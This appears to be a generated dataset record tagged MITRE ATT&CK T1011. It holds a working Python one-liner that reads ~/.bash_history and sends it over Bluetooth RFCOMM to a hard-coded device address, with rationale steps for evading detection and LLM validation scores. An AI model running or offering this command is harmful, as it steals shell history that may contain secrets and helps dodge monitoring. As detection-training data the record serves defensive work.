{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
  "explanation": "Uses Bluetooth RFCOMM channel 27 to move shell history data outside the normal IP stack, consistent with T1011 exfiltration over other network mediums.",
  "rationale_steps": [
    "Choose Bluetooth (RFCOMM) to avoid IP-based monitoring.",
    "Connect to an uncommon RFCOMM channel (27) to reduce detection.",
    "Read and send ~/.bash_history over the RFCOMM socket.",
    "Terminate connection cleanly to leave minimal indicators."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-dde69e91",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Well-formed python -c one-liner with balanced quotes/parentheses, valid socket constants, and proper statement separators.",
        "semantic_score": 4,
        "semantic_justification": "It reads ~/.bash_history and exfiltrates it over Bluetooth RFCOMM (non-IP), aligning with the stated intent, but depends on a listening peer, Bluetooth stack support, and user permissions.",
        "combined_score": 4.5,
        "confidence": 0.86,
        "timestamp": "2025-10-01T15:33:04.215533Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, valid imports, correct socket operations, and proper statement separation using semicolons for a single-line execution.",
        "semantic_score": 5,
        "semantic_justification": "The command accurately leverages Bluetooth RFCOMM to exfiltrate shell history outside the traditional IP stack, perfectly aligning with T1011's description of using covert channels and non-standard network mediums for exfiltration, which is often combined with traffic signaling.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-01T15:33:20.378356Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.5,
    "llm_average_score": 4.75,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}